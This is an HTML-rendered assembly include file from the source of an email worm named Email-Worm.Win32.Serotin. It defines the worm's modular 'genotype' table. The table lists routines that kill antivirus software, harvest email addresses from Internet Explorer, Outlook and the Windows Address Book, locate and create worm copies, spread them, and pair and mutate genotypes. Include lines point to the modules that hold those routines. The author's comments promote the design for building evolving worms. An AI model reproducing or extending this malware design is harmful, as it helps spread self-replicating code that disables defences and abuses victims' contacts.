<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Serotin - genotype.inc.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc9 {
	color: #0080FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Here startz the description of worm genotype. Every "addition" code that can</span><span class="sc0">
</span><span class="sc1">;be advanced sometimez later is written in separate part of genotype, so called GEN,</span><span class="sc0">
</span><span class="sc1">;so it can be later easily updated and passed down to another worm generation. Genotype</span><span class="sc0">
</span><span class="sc1">;is easily exchangable and updateable with another genotypez = it is very good tool</span><span class="sc0">
</span><span class="sc1">;for creating worm genetic algorithms!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------</span><span class="sc0">
</span><span class="sc1">;structure is very simple:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;DWORD  count_of_gens</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;BYTE   type of gen</span><span class="sc0">
</span><span class="sc1">;DWORD  relative pointer to gen procedure</span><span class="sc0">
</span><span class="sc1">;DWORD  size of gen procedure</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   ... X count_of_gens</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Becoz gen procedures MUST be TOTALLY independend on other worm code, and also</span><span class="sc0">
</span><span class="sc1">;must have specific functionality, it recieves some parameterz via registers.</span><span class="sc0">
</span><span class="sc1">;EVERY procedure has initialized ESI and EDI registerz - there are pointerz to</span><span class="sc0">
</span><span class="sc1">;GetModuleHandleA and GetProcAddress APIz.</span><span class="sc0">
</span><span class="sc1">;Depending on gen type, in EBX there may be one, procedure specific parameter.</span><span class="sc0">
</span><span class="sc1">;And also, output is passed out in EAX.</span><span class="sc0">




</span><span class="sc5">GENOTYPE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">11</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_INITWORM</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_avs</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_kill_avs</span><span class="sc4">-</span><span class="sc5">kill_avs</span><span class="sc0">



        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_FINDVICTIMS</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_email_addresses_from_ie</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_get_email_addresses_from_ie</span><span class="sc4">-</span><span class="sc5">get_email_addresses_from_ie</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_FINDVICTIMS</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_email_addresses_from_ol</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_get_email_addresses_from_ol</span><span class="sc4">-</span><span class="sc5">get_email_addresses_from_ol</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_FINDVICTIMS</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_email_addresses_from_wab</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_get_email_addresses_from_wab</span><span class="sc4">-</span><span class="sc5">get_email_addresses_from_wab</span><span class="sc0">



        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_FINDWORM</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">find_worm_ftp</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_find_worm_ftp</span><span class="sc4">-</span><span class="sc5">find_worm_ftp</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_FINDWORM</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">find_worm_ip</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_find_worm_ip</span><span class="sc4">-</span><span class="sc5">find_worm_ip</span><span class="sc0">



        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_CREATEWORM</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">create_worm</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_create_worm</span><span class="sc4">-</span><span class="sc5">create_worm</span><span class="sc0">



        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_SPREADWORM</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">spread_worm</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_spread_worm</span><span class="sc4">-</span><span class="sc5">spread_worm</span><span class="sc0">



        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_PAIRGENOTYPES</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pair1</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_pair1</span><span class="sc4">-</span><span class="sc5">pair1</span><span class="sc0">



        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_MUTATEGENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutate1</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_mutate1</span><span class="sc4">-</span><span class="sc5">mutate1</span><span class="sc0">



        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">GEN_CUSTOM</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dotnet</span><span class="sc4">-</span><span class="sc5">GENOTYPE</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">end_dotnet</span><span class="sc4">-</span><span class="sc5">dotnet</span><span class="sc0">



</span><span class="sc1">;--------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;INPUT:</span><span class="sc0">
</span><span class="sc1">;   1st argument        -   EBX</span><span class="sc0">
</span><span class="sc1">;   GetModuleHandleA API    -   ESI</span><span class="sc0">
</span><span class="sc1">;   GetProcAddress API  -   EDI</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;OUTPUT:</span><span class="sc0">
</span><span class="sc1">;   CF  -   set if error</span><span class="sc0">
</span><span class="sc1">;   EAX -   result</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------</span><span class="sc0">


</span><span class="sc1">;*************************************************************************************</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">avs.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">ie.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">ol.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">wab.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">fwf.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">fwi.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">cw.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">sw.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">p1.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">m1.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">genz</span><span class="sc0">\</span><span class="sc5">dotnet.inc</span><span class="sc0">


</span><span class="sc5">end_GENOTYPE</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">DISPPARAMS</span><span class="sc0">              </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Arguments</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Array of arguments.</span><span class="sc0">
</span><span class="sc5">Disp_IDs</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Dispatch ID's of named arguments.</span><span class="sc0">
</span><span class="sc5">Argument_Count</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Number of arguments.</span><span class="sc0">
</span><span class="sc5">Disp_ID_Count</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Number of dispatcher IDs.</span><span class="sc0">
</span><span class="sc5">DISPPARAMS</span><span class="sc0">              </span><span class="sc5">ENDS</span></div></body>
</html>
